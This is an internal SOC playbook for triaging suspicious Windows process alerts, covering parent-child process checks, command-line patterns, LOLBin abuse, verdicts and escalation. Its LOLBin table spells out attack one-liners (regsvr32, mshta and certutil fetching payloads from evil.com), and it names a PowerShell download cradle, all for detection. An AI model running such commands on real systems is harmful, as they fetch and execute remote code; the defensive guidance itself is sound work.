# Suspicious Process Analysis Playbook

**Version:** 1.0  
**Owner:** SOC Team  
**Last Updated:** April 2026  
**Classification:** Internal Use Only

---

## Purpose

This playbook outlines the process for investigating alerts related to suspicious or malicious process execution on Windows endpoints. It is designed for Level 1 SOC Analysts and focuses on initial triage, evidence collection, and escalation decisions.

---

## Scope

This playbook applies to any alert generated by EDR, Sysmon, or Windows Event Logs that indicates potentially malicious process activity. This includes but is not limited to:

- Unusual parent-child process relationships
- Execution of scripts from suspicious locations
- Processes making outbound network connections
- Known LOLBin (Living Off the Land Binary) abuse

---

## Triage Phase (First 15 Minutes)

### Step 1: Review the Alert Details

Open the alert in your SIEM or EDR console. Note the following baseline information:

- **Hostname:** Which endpoint generated the alert?
- **Username:** Which user account was active at the time?
- **Process Name:** What executable was run?
- **Process Path:** Where did the executable run from?
- **Parent Process:** What launched it?
- **Command Line:** Full command line arguments used.
- **Timestamp:** When did this occur?

### Step 2: Perform a Quick Risk Assessment

Ask yourself these initial questions:

| Question | Low Risk | High Risk |
| :--- | :--- | :--- |
| **Is the process signed?** | Yes, by a trusted vendor | No, or signed by an unknown/expired cert |
| **Is the path expected?** | `C:\Program Files\...` | `C:\Users\...\AppData\Local\Temp\` |
| **Is the parent process normal?** | `explorer.exe` launching `notepad.exe` | `winword.exe` launching `powershell.exe` |
| **Is the command line suspicious?** | Simple, expected arguments | Base64 encoded strings, download cradle, obfuscation |
| **Is the user privileged?** | Standard user | Domain Admin or local administrator |

If **two or more** high-risk indicators are present, treat the alert as a priority.

### Step 3: Document the Alert

Create a case in ServiceNow (or your ticketing system) with:

- Hostname and username
- Process name and PID (if available)
- Parent process
- Command line (full string)
- Alert rule that triggered

## Analysis Phase

### 1. Validate the Process

Use your EDR or SIEM to gather additional context.

#### File Metadata
- **File hash (SHA-256):** Submit to VirusTotal. Check for detections and community comments.
- **Digital signature:** Is it valid? Who signed it? Has the certificate been revoked?
- **File creation date:** Does it align with user activity on the host?
- **Prevalence:** How common is this hash across your estate? A one-off is more suspicious.

#### Network Connections
If the process made network connections:
- **Destination IP:** Check reputation via VirusTotal or AbuseIPDB.
- **Destination port:** Unusual ports (e.g., 4444, 8080, 1337) are red flags.
- **Protocol:** HTTP/S to a raw IP address is suspicious; DNS queries to DGA-like domains are high risk.

### 2. Analyse the Parent-Child Relationship

Suspicious parent-child combinations are a strong indicator of malicious activity.

#### Common Suspicious Combinations

| Parent Process | Child Process | Why It's Suspicious |
| :--- | :--- | :--- |
| `winword.exe` / `excel.exe` | `powershell.exe`, `cmd.exe`, `wscript.exe` | Office macro executing script |
| `outlook.exe` | `powershell.exe`, `mshta.exe` | Email-based script execution |
| `wmiprvse.exe` | `powershell.exe`, `cmd.exe` | WMI lateral movement |
| `services.exe` | `cmd.exe` | Unusual service spawning shell |
| `java.exe` / `javaw.exe` | `powershell.exe` | Log4Shell or similar exploit |
| `msiexec.exe` | `cmd.exe`, `powershell.exe` | Malware installation via MSI |

#### Benign Combinations (Usually Safe)

| Parent Process | Child Process | Normal Context |
| :--- | :--- | :--- |
| `explorer.exe` | Any user-launched GUI app | User double-clicked |
| `svchost.exe` | `rundll32.exe`, `msiexec.exe` | Windows Update or service install |
| `taskeng.exe` | `cmd.exe` | Scheduled task running a script |

### 3. Examine the Command Line

The command line often contains the clearest evidence of malicious intent.

#### High-Risk Command Line Patterns

| Pattern | What It Indicates |
| :--- | :--- |
| `-EncodedCommand` or `-enc` | PowerShell executing Base64-encoded script |
| `IEX(New-Object Net.WebClient).DownloadString` | PowerShell download cradle |
| `-WindowStyle Hidden` | Attempt to hide activity from user |
| `-ExecutionPolicy Bypass` | Overriding PowerShell security controls |
| `cmd.exe /c` followed by `ping` or `whoami` | Reconnaissance |
| `reg add` or `reg delete` | Registry persistence modification |
| `schtasks /create` | Scheduled task persistence |
| `wmic process call create` | Remote process creation |
| `bitsadmin /transfer` | Alternative download method |

#### Decoding Obfuscated Commands

If you encounter Base64-encoded PowerShell:
1. Copy the encoded string (everything after `-EncodedCommand`).
2. Use **CyberChef** to decode from Base64 (recipe: `From Base64` then `Decode text (UTF-16LE)`).
3. Review the decoded script for malicious functions.

### 4. Check for LOLBin Abuse

Living Off the Land Binaries (LOLBins) are legitimate Windows executables abused by attackers to avoid detection. Always investigate when these are seen with unusual command lines.

| Binary | Suspicious Use Case |
| :--- | :--- |
| `rundll32.exe` | Executing JavaScript/VBScript from URL: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ..."` |
| `regsvr32.exe` | Loading remote scriptlet: `regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll` |
| `mshta.exe` | Executing remote HTA: `mshta.exe http://evil.com/payload.hta` |
| `certutil.exe` | Downloading files: `certutil.exe -urlcache -split -f http://evil.com/payload.exe` |
| `wmic.exe` | Remote execution: `wmic /node:"target" process call create "cmd.exe"` |
| `cscript.exe` / `wscript.exe` | Executing VBS/JS scripts from suspicious locations |

### 5. Pivot to Related Events

Use the same timeframe and host to search for:

- **File creation events:** Did the process drop any files? (Look in `%TEMP%`, `%APPDATA%`, `C:\ProgramData\`)
- **Registry modifications:** New run keys or services added?
- **Network connections:** Any subsequent C2 traffic?
- **Additional processes:** Did this process spawn others?
- **User logins:** Any unusual authentication around the same time?

## Verdict & Actions

### Benign (False Positive)

**Criteria:**
- Process is signed by a trusted vendor (Microsoft, Adobe, etc.).
- Path is expected for the application.
- Parent-child relationship is normal.
- No suspicious network connections or file drops.
- User confirms legitimate activity.

**Action:**
- Document the rationale.
- Close the alert as a false positive.
- Consider tuning the detection rule to reduce future noise.

### Suspicious (Requires Further Investigation)

**Criteria:**
- Process unsigned or signed by unknown entity.
- Runs from a user-writable path (Temp, Downloads, AppData).
- Command line contains suspicious patterns but no clear malicious payload.
- No confirmed network beaconing yet.

**Action:**
1. Escalate to **Level 2 SOC Analyst** for deeper analysis.
2. Recommend isolating the host if the process is still active.
3. Provide all gathered context in the escalation notes.

### Malicious (Confirmed Threat)

**Criteria:**
- VirusTotal shows multiple detections.
- Process connects to known C2 infrastructure.
- Command line decodes to a known malware payload.
- File hash matches known IOCs.
- Lateral movement or credential access observed.

**Action:**
1. **Isolate the host immediately** (coordinate with IT/Endpoint team).
2. Block the file hash and network IOCs in security tools.
3. Escalate to **Level 3 / Incident Response** for full investigation.
4. Search for other hosts with the same process hash or parent-child pattern.
5. Consider resetting the affected user's credentials.

---

## Escalation Criteria

Escalate to **Level 2 SOC Analyst** if:

- The process is confirmed or strongly suspected malicious.
- The affected user has elevated privileges (Domain Admin, Local Admin).
- The process exhibits network beaconing to an unknown external IP.
- You identify LOLBin abuse with a confirmed malicious command line.
- The same process or pattern is observed on multiple hosts.

Escalate to **Incident Response** if:

- Credential dumping tools detected (`mimikatz`, `procdump` on LSASS).
- Lateral movement detected (PsExec, WMI, WinRM to other hosts).
- Ransomware indicators (volume shadow copy deletion, file encryption).
- Data exfiltration observed (large outbound transfers).

---

## Post-Analysis Documentation

Ensure the following is recorded before closing the case:

- [ ] Alert details (host, user, process, command line) documented.
- [ ] Analysis steps taken (VirusTotal check, command line decoding, etc.).
- [ ] Verdict assigned (Benign / Suspicious / Malicious).
- [ ] IOCs recorded (file hash, IP, domain, MITRE technique).
- [ ] Actions taken (host isolation, block applied, escalation).
- [ ] Any tuning recommendations for the detection rule.

## MITRE ATT&CK Techniques (Reference)

Common techniques associated with suspicious process alerts:

| Technique ID | Name | Relevance |
| :--- | :--- | :--- |
| **T1059** | Command and Scripting Interpreter | PowerShell, CMD, WScript abuse |
| **T1204** | User Execution | Malicious document or link |
| **T1055** | Process Injection | One process manipulating another |
| **T1218** | System Binary Proxy Execution | LOLBin abuse (rundll32, mshta) |
| **T1047** | Windows Management Instrumentation | WMI lateral movement |
| **T1053** | Scheduled Task/Job | Persistence via schtasks |
| **T1547** | Boot or Logon Autostart Execution | Registry run keys |
